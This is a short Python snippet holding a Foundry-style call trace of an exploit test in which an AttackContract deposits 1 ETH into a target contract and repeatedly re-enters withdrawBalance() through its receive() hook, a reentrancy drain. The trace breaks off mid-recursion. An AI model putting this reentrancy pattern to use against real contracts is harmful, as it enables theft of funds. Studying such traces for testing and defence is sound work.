import json

log = """
    ├─ [178495] ExploitTest::test_exploit()
    │   ├─ [168537] AttackContract::execute()
    │   │   ├─ [22374] 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f::addToBalance{value: 1000000000000000000}()
    │   │   │   └─ ← [Stop]
    │   │   ├─ [134068] 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f::withdrawBalance()
    │   │   │   ├─ [126853] AttackContract::receive{value: 1000000000000000000}()
    │   │   │   │   ├─ [547] 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f::getBalance(AttackContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   │   │   ├─ [104445] 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f::withdrawBalance()
    │   │   │   │   │   ├─ [97230] AttackContract::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   ├─ [547] 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f::getBalance(AttackContract: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
"""
